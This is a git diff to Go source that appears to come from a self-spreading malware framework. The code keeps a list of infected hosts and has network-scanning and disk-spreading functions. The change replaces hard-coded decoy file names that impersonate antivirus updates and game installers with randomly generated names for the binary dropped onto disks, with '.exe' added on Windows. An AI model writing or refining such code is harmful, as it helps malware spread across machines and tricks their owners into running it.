@@ -16,6 +16,7 @@ import (
 	"github.com/google/gopacket/pcap"
 	"github.com/mostlygeek/arp"
 	coldfire "github.com/redcode-labs/Coldfire"
+	"github.com/yelinaung/go-haikunator"
 )
 
 var infected_hosts = []string{}
@@ -240,9 +241,8 @@ func NeuraxScan(c chan string) {
 }
 
 func NeuraxDisks() error {
-	//Probably should use Haikunator here...
-	names := []string{"avast_update", "tetris", "kaspersky_protect", "witcher_3_installer"} //TODO: Add more names
-	selected_name := coldfire.RandomSelectStr(names)
+	haikunator := haikunator.New(time.Now().UTC().UnixNano())
+	selected_name := haikunator.HaikuNate()
 	if runtime.GOOS == "windows" {
 		selected_name += ".exe"
 	}
